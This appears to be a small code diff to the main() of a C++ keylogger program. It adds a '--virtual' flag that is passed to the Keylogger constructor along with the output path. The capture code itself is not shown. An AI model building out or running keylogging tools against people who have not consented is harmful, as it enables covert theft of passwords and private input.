@@ -18,8 +18,9 @@ int main(int argc, char** argv) {
   try {
     ArgParser p(argv, argv + argc);
     auto output = p.parse_string("--output");
+    auto record_virtual = p.exists("--virtual");
 
-    Keylogger k(output.value());
+    Keylogger k(output.value(), record_virtual);
     k.Run();
   } catch (const std::exception& e) {
     std::cerr << "error: " << e.what() << std::endl;
